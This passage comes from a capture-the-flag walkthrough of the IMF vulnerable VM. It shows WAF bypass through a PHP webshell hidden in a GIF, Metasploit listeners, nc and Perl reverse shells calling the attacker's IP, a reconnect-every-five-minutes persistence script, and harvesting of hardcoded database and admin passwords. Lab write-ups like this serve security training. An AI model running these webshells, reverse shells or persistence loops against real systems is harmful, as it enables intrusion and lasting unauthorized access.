    <div>root@kali:~/Walkthroughs/imf# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=443 -e php/base64 -f raw &gt; rev.php</div>
    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
    <div>[-] No arch selected, selecting arch: php from the payload</div>
    <div>Found 1 compatible encoders</div>
    <div>Attempting to encode payload with 1 iterations of php/base64</div>
    <div>php/base64 succeeded with size 4041 (iteration=0)</div>
    <div>php/base64 chosen with final size 4041</div>
    <div>Payload size: 4041 bytes</div>
</div>
<div><br /></div>
<div><img height="296" src="/assets/images/2019-05-02-imf-1/099E02BB-4E29-4402-A914-6958FF3622DF.png" width="990" /><br /></div>
<div><br /></div>
<div>Next, I tried creating a PHP file with a simple PHP cmd processor.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>&lt;?php echo system($_GET["cmd"]); ?&gt;</div>
</div>
<div><br /></div>
<div>But got this...</div>
<div><br /></div>
<div><img height="300" src="/assets/images/2019-05-02-imf-1/179554C0-DFA3-4FFD-8977-6C4C4EA6A13F.png" width="1026" /><br /></div>
<div><br /></div>
<div>Doing some research into WAF bypass techniques (<a href="https://securityonline.info/bypwass-waf-upload-shell-webserver/" target="_blank">https://securityonline.info/bypwass-waf-upload-shell-webserver/</a>), I decided to try to create an image file with the right "signature", but then have it contain PHP code. As listed on the page linked (and manually confirmed through some hex dump tests I did), here are common image signatures (occurring at the start of the file).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>jpg (JFIF): FFD8FFEO00104A464946</div>
    <div>gif (GIF89a): 474946383961</div>
    <div>png (PNG): 89504E47</div>
</div>
<div><br /></div>
<div>I'll create a test GIF using the following commands.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# echo "474946383961" | xxd -r -p &gt; test.gif</div>
    <div>root@kali:~/Walkthroughs/imf# echo "&lt;?php phpinfo(); ?&gt;" &gt;&gt; test.gif</div>
    <div>root@kali:~/Walkthroughs/imf# hexdump -C test.gif </div>
    <div>00000000Â Â 47 49 46 38 39 61 3c 3fÂ Â 70 68 70 20 70 68 70 69Â Â |GIF89a&lt;?php phpi|</div>
    <div>00000010Â Â 6e 66 6f 28 29 3b 20 3fÂ Â 3e 0aÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â |nfo(); ?&gt;.|</div>
    <div>0000001a</div>
</div>
<div><br /></div>
<div>Trying to upload the file returns a "File successfully uploaded." message, but I'm not able to access it in the /uploads/ folder I detected earlier.</div>
<div><br /></div>
<div><a href="http://10.183.0.188/imfadministrator/uploads/test.gif">http://10.183.0.188/imfadministrator/uploads/test.gif</a>Â = Not Found</div>
<div><br /></div>
<div>Checking the HTML returned by a successful upload, I noticed the following comment.</div>
<div><br /></div>
<div><img height="188" src="/assets/images/2019-05-02-imf-1/30B24655-A6FA-4C55-82FE-CE5B220F0272.png" width="1464" /><br /></div>
<div><br /></div>
<div>This doesn't look like one of the many base64 encoded strings we've seen. Could it be the new filename of my uploaded file? Trying to go toÂ <a href="http://10.183.0.188/imfadministrator/uploads/31361fece66a.gif">http://10.183.0.188/imfadministrator/uploads/31361fece66a.gif</a>Â returned the following.</div>
<div><br /></div>
<div><img height="540" src="/assets/images/2019-05-02-imf-1/C797F30A-A4F2-4227-B931-102A02484137.png" width="2292" /><br /></div>
<div><br /></div>
<div>Nice! My GIF file is getting run as PHP code (not normal, but O.K.). Let's see if we can use the same technique with ourÂ simple PHP cmd processor from earlier (with a few tweaks). Since I know the WAF won't allow me to use the system command, I'll try to use backticks to execute a system command.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>&lt;?php $cmd=$_GET['cmd']; echo `$cmd`; ?&gt;</div>
</div>
<div><br /></div>
<div>I'll recreate my GIF image.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# echo "474946383961" | xxd -r -p &gt; test.gif</div>
    <div>root@kali:~/Walkthroughs/imf# echo "&lt;?php \$cmd=\$_GET[\"cmd\"]; echo \`\$cmd\`; ?&gt;" &gt;&gt; test.gif </div>
    <div>root@kali:~/Walkthroughs/imf# hexdump -C test.gif </div>
    <div>00000000Â Â 47 49 46 38 39 61 3c 3fÂ Â 70 68 70 20 24 63 6d 64Â Â |GIF89a&lt;?php $cmd|</div>
    <div>00000010Â Â 3d 24 5f 47 45 54 5b 22Â Â 63 6d 64 22 5d 3b 20 65Â Â |=$_GET["cmd"]; e|</div>
    <div>00000020Â Â 63 68 6f 20 60 24 63 6dÂ Â 64 60 3b 20 3f 3e 0aÂ Â Â Â Â |cho `$cmd`; ?&gt;.|</div>
    <div>0000002f</div>
</div>
<div><br /></div>
<div>The upload is successful and checking the comment in the page, my new file id is 20ddebdee890. Let's test it out.</div>
<div><br /></div>
<div><a href="http://10.183.0.188/imfadministrator/uploads/20ddebdee890.gif?cmd=id">http://10.183.0.188/imfadministrator/uploads/20ddebdee890.gif?cmd=id</a></div>
<div><br /></div>
<div><img height="48" src="/assets/images/2019-05-02-imf-1/B833BB0A-49C5-469F-970E-5FC2907C428E.png" width="918" /><br /></div>
<div><br /></div>
<div>ðŸ˜„ðŸ˜„ðŸ˜„ It took us a long time and LOTS of trial and error to get to this point. Time to get our reverse shell!</div>
<div><br /></div>
<div>First, we'll fire up our listeners in Metasploit. I like to start two listeners so I can get the first session connected via the HTTP request (which is often short lived) and the second session started from the victim itself.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 &gt; use exploit/multi/handler</div>
    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
    <div>payload =&gt; generic/shell_reverse_tcp</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
    <div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div>
    <div>LPORT =&gt; 5432</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 0.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div>
    <div>msf5 exploit(multi/handler) &gt; </div>
    <div>msf5 exploit(multi/handler) &gt; use exploit/multi/handler</div>
    <div>msf5 exploit(multi/handler) &gt; set payload generic/shell_reverse_tcp</div>
    <div>payload =&gt; generic/shell_reverse_tcp</div>
    <div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div>
    <div>LHOST =&gt; 10.183.0.222</div>
    <div>msf5 exploit(multi/handler) &gt; set LPORT 5433</div>
    <div>LPORT =&gt; 5433</div>
    <div>msf5 exploit(multi/handler) &gt; run -j</div>
    <div>[*] Exploit running as background job 1.</div>
    <div>[*] Exploit completed, but no session was created.</div>
    <div>
        <div><br /></div>
    </div>
    <div>[*] Started reverse TCP handler on 10.183.0.222:5433</div>
</div>
<div><br /></div>
<div>Now we can pass our URL encoded reverse shell command. Here is the command we are encoding.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.183.0.222 5432 &gt;/tmp/f</div>
</div>
<div><br /></div>
<div>Hitting the following URL, my session is created in Metasploit and I'm able to start my second reverse shell session.</div>
<div><br /></div>
<div><a href="http://10.183.0.188/imfadministrator/uploads/20ddebdee890.gif?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.183.0.222%205432%20%3E%2Ftmp%2Ff">http://10.183.0.188/imfadministrator/uploads/20ddebdee890.gif?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.183.0.222%205432%20%3E%2Ftmp%2Ff</a></div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.188:53798) at 2019-05-03 11:51:58 -0400</div>
    <div>
        <div><br /></div>
    </div>
    <div>msf5 exploit(multi/handler) &gt; sessions 1</div>
    <div>[*] Starting interaction with 1...</div>
    <div>
        <div><br /></div>
    </div>
    <div>pwd</div>
    <div>/var/www/html/imfadministrator/uploads</div>
    <div>$ id</div>
    <div>uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
    <div>$ perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};' &amp;</div>
    <div>$ [*] Command shell session 2 opened (10.183.0.222:5433 -&gt; 10.183.0.188:49008) at 2019-05-03 11:52:14 -0400</div>
</div>
<div><br /></div>
<div>Checking the uploads directory we dropped into, we've found our fifth flag.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/var/www/html/imfadministrator/uploads$ cat flag5_abc123def.txt</div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">flag5{YWdlbnRzZXJ2aWNlcw==}</font>
    </div>
</div>
<div><br /></div>
<div>Decoding the Base64 string in the flag, we get the string 'agentservices'.</div>
<div><br /></div>
<div>Also, checking the .htaccess file in the uploads directory, we see why our GIF file (with only a .gif extension) was able to execute as PHP code.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/var/www/html/imfadministrator/uploads$ cat .htaccess </div>
    <div>AddType application/x-httpd-php .php .gif</div>
    <div>AddHandler application/x-httpd-php .gif</div>
</div>
<div><br /></div>
<div>This would be an a-typical set up, obviously. However, some of the same techniques would have worked if the file wasn't automatically getting renamed and we could upload our filename as test.php.gif (and request it as test.php.gif).</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Maintaining Access</h2>
</div>
<div><br /></div>
<div>Since SSH isn't open on the victim, I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutesÂ and use python'sÂ SimpleHTTPServer to serve it up to the victim.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# cat 89141121ca4e.jpg</div>
    <div>#!/bin/sh</div>
    <div>while true; do</div>
    <div>Â Â Â Â perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
    <div>Â Â Â Â # sleep for 300 seconds (5 mins)</div>
    <div>Â Â Â Â sleep 300</div>
    <div>done</div>
    <div>root@kali:~/Walkthroughs/imf# python -m SimpleHTTPServer 4321</div>
    <div>Serving HTTP on 0.0.0.0 port 4321 ...</div>
    <div>10.183.0.188 - - [03/May/2019 11:58:52] "GET /89141121ca4e.jpg HTTP/1.1" 200 -</div>
</div>
<div><br /></div>
<div>I uploaded the script to the victim's /var/www/html/imfadministrator/uploadsÂ directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/var/www/html/imfadministrator/uploads$ wget -O 89141121ca4e.jpg 10.183.0.222:4321/89141121ca4e.jpg</div>
    <div>--2019-05-03 11:58:52--Â Â http://10.183.0.222:4321/89141121ca4e.jpg</div>
    <div>Connecting to 10.183.0.222:4321... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 309 [image/jpeg]</div>
    <div>Saving to: '89141121ca4e.jpg'</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â 0KÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 100% 49.1M=0s</div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-05-03 11:58:52 (49.1 MB/s) - '89141121ca4e.jpg' saved [309/309]</div>
    <div>www-data@imf:/var/www/html/imfadministrator/uploads$ chmod +x 89141121ca4e.jpg</div>
    <div>www-data@imf:/var/www/html/imfadministrator/uploads$ ./89141121ca4e.jpg &amp;</div>
    <div>[1] 7036</div>
</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Privilege Escalation</h2>
</div>
<div><br /></div>
<div>Dropping back a directory from uploads, we see our cms.php page. We know this page did a database lookup, so it likely contains DB credentials.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/var/www/html/imfadministrator$ cat cms.php</div>
    <div>&lt;?php error_reporting(E_ALL); ini_set('display_errors', 1); session_start(); ?&gt;&lt;html&gt;</div>
    <div>&lt;head&gt;</div>
    <div>&lt;title&gt;IMF CMS&lt;/title&gt;</div>
    <div>&lt;/head&gt;</div>
    <div>&lt;body&gt;</div>
    <div>&lt;h1&gt;IMF CMS&lt;/h1&gt;</div>
    <div>&lt;?php </div>
    <div>if(isset($_SESSION['admin_logged_on']) &amp;&amp; $_SESSION['admin_logged_on'] == 'that is affirmative sir') {</div>
    <div>?&gt;</div>
    <div>Menu: </div>
    <div>&lt;a href='cms.php?pagename=home'&gt;Home&lt;/a&gt; | </div>
    <div>&lt;a href='cms.php?pagename=upload'&gt;Upload Report&lt;/a&gt; | </div>
    <div>&lt;a href='cms.php?pagename=disavowlist'&gt;Disavowed list&lt;/a&gt; | </div>
    <div>Logout</div>
    <div>&lt;br /&gt;&lt;br/&gt;</div>
    <div>&lt;?php</div>
    <div>Â Â Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">$db_user = 'admin';</font>
    </div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">Â Â Â Â Â Â Â Â $db_pass = '3298fj8323j80df!49';</font>
    </div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">Â Â Â Â Â Â Â Â $db_name = 'admin';</font>
    </div>
    <div>Â Â Â Â Â Â Â Â $link = mysqli_connect('localhost',$db_user,$db_pass,$db_name);</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â Â Â Â $pagename = isset($_GET['pagename'])?$_GET['pagename']:'home';</div>
    <div>Â Â Â Â Â Â Â Â $pagename = str_replace('--', '', $pagename);</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â Â Â Â $query = "SELECT `pagedata` FROM `pages` WHERE `pagename` = '".$pagename."'";</div>
    <div>Â Â Â Â Â Â Â Â $result = mysqli_query($link, $query);</div>
    <div>
        <div><br /></div>
    </div>
    <div>Â Â Â Â Â Â Â Â $page = mysqli_fetch_row($result);</div>
    <div>Â Â Â Â Â Â Â Â print $page[0];</div>
    <div>} else {</div>
    <div>Â Â Â Â Â Â Â Â print "Please login &lt;a href='index.php'&gt;Here&lt;/a&gt;";</div>
    <div>}</div>
    <div>?&gt;</div>
    <div>&lt;/body&gt;</div>
    <div>&lt;/html&gt;</div>
</div>
<div><br /></div>
<div>We already know there isn't much else in the database to mine out, but it's always nice to harvest credentials that might be reused in other places.</div>
<div><br /></div>
<div>Checking index.php, we are able to see that "mad secure" hard coded password Roger mentioned.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/var/www/html/imfadministrator$ cat index.php</div>
    <div>&lt;?php</div>
    <div>session_start();</div>
    <div>$loggedin=false;</div>
    <div>if ($_SESSION['admin_logged_on'] == 'that is affirmative sir') {</div>
    <div>Â Â Â Â Â Â Â Â echo "flag3{Y29udGludWVUT2Ntcw==}&lt;br /&gt;Welcome, ".$_POST["user"] . "&lt;br /&gt;&lt;a href='cms.php?pagename=home'&gt;IMF CMS&lt;/a&gt;";</div>
    <div>Â Â Â Â Â Â Â Â $loggedin=true;</div>
    <div>} elseif (isset($_POST["user"]) &amp;&amp; isset($_POST["pass"])) {</div>
    <div>Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">$password = "398fj289fj2389fj398fjhhds^&amp;#hkseifw3893h#(&amp;$$*838hjf";</font>
    </div>
    <div>Â Â Â Â sleep(3); // do not bruteforce</div>
    <div>Â Â Â Â if ($_POST["user"]=='rmichaels') {</div>
    <div>Â Â Â Â Â Â Â Â if (strcmp($password, $_POST["pass"]) == 0) {</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â $_SESSION['admin_logged_on'] = 'that is affirmative sir';</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â echo "flag3{Y29udGludWVUT2Ntcw==}&lt;br /&gt;Welcome, ".$_POST["user"] . "&lt;br /&gt;&lt;a href='cms.php?pagename=home'&gt;IMF CMS&lt;/a&gt;";</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â $loggedin=true;</div>
    <div>Â Â Â Â Â Â Â Â } else {</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â echo "Invalid password";</div>
    <div>Â Â Â Â Â Â Â Â }</div>
    <div>Â Â Â Â } else {</div>
    <div>Â Â Â Â Â Â Â Â echo "Invalid username.";</div>
    <div>Â Â Â Â }Â Â Â </div>
    <div>Â Â Â Â </div>
    <div>}</div>
    <div>if($loggedin===false) {</div>
    <div>?&gt;</div>
    <div>&lt;form method="POST" action=""&gt;</div>
    <div>&lt;label&gt;Username:&lt;/label&gt;&lt;input type="text" name="user" value=""&gt;&lt;br /&gt;</div>
    <div>&lt;label&gt;Password:&lt;/label&gt;&lt;input type="password" name="pass" value=""&gt;&lt;br /&gt;</div>
    <div>&lt;input type="submit" value="Login"&gt;</div>
    <div>&lt;!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --&gt;</div>
    <div>&lt;/form&gt;</div>
    <div>&lt;?php } ?&gt;</div>
</div>
<div><br /></div>
<div>There was no way we were going to crack that with hydra.</div>
<div><br /></div>
<div>Trying to check sudo fails because I don't have a TTY shell.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ sudo -l</div>
    <div>sudo: no tty present and no askpass program specified</div>
</div>
<div><br /></div>
<div>Typically I'd run the following command to fix that issue, but python isn't available on the victim...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ python -c 'import pty; pty.spawn("/bin/bash")'</div>
    <div>python -c 'import pty; pty.spawn("/bin/bash")'</div>
    <div>The program 'python' can be found in the following packages:</div>
    <div> * python-minimal</div>
    <div> * python3</div>
    <div>Ask your administrator to install one of them</div>
</div>
<div><br /></div>
<div>...or is it? Let's make sure our PATH variable has all the typical locations and then check for python/python2/python3 using which.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ export PATH=$PATH:/home/seekorswim:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</div>
    <div>www-data@imf:/$ which python</div>
    <div>www-data@imf:/$ which python2</div>
    <div>www-data@imf:/$ which python3</div>
    <div>/usr/bin/python3</div>
</div>
<div><br /></div>
<div>Ah, so we have python3 only. That should be fine for getting a TTY shell and trying sudo again.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
    <div>www-data@imf:/$ sudo -l</div>
    <div>sudo -l</div>
    <div>[sudo] password for www-data: ^C</div>
</div>
<div><br /></div>
<div>Well, that was fruitless.</div>
<div><br /></div>
<div>Checking netstat for open ports, we see a few that we can't access externally.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ netstat -lnp</div>
    <div>(Not all processes could be identified, non-owned process info</div>
    <div> will not be shown, you would have to be root to see it all.)</div>
    <div>Active Internet connections (only servers)</div>
    <div>Proto Recv-Q Send-Q Local AddressÂ Â Â Â Â Â Â Â Â Â Â Foreign AddressÂ Â Â Â Â Â Â Â Â StateÂ Â Â Â Â Â Â PID/Program name</div>
    <div>tcpÂ Â Â Â Â Â Â Â 0Â Â Â Â Â Â 0 127.0.0.1:3306Â Â Â Â Â Â Â Â Â Â 0.0.0.0:*Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â LISTENÂ Â Â Â Â Â -Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>tcpÂ Â Â Â Â Â Â Â 0Â Â Â Â Â Â 0 0.0.0.0:7788Â Â Â Â Â Â Â Â Â Â Â Â 0.0.0.0:*Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â LISTENÂ Â Â Â Â Â -Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>tcpÂ Â Â Â Â Â Â Â 0Â Â Â Â Â Â 0 0.0.0.0:22Â Â Â Â Â Â Â Â Â Â Â Â Â Â 0.0.0.0:*Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â LISTENÂ Â Â Â Â Â -Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>tcp6Â Â Â Â Â Â Â 0Â Â Â Â Â Â 0 :::80Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â :::*Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â LISTENÂ Â Â Â Â Â -Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>tcp6Â Â Â Â Â Â Â 0Â Â Â Â Â Â 0 :::22Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â :::*Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â LISTENÂ Â Â Â Â Â -Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â </div>
    <div>udpÂ Â Â Â Â Â Â Â 0Â Â Â Â Â Â 0 0.0.0.0:68Â Â Â Â Â Â Â Â Â Â Â Â Â Â 0.0.0.0:*Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â -</div>
</div>
<div><br /></div>
<div>I have a good idea about what 3306 (mysql), 22 (ssh) and 80 (http) are. I'm not sure about the service listening on 7788. That might be interesting. I know that port isn't accessible from the outside, but we should be able to connect to it locally.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/$ nc 10.183.0.188 7788</div>
    <div>Â Â ___ __Â Â __ ___ </div>
    <div> |_ _|Â Â \/Â Â | __|Â Â Agent</div>
    <div>Â Â | || |\/| | _|Â Â Â Reporting</div>
    <div> |___|_|Â Â |_|_|Â Â Â Â System</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>Agent ID :</div>
</div>
<div><br /></div>
<div>Cool. A fancy login. Unfortunately, I'm not sure I have enough information at this point to try to login. Just putting in '1' returned an error "Invalid Agent ID" and disconnected me. I might be able to enumerate the agent IDs through brute force, or I may be able to try to overflow input, but I'll keep digging first.</div>
<div><br /></div>
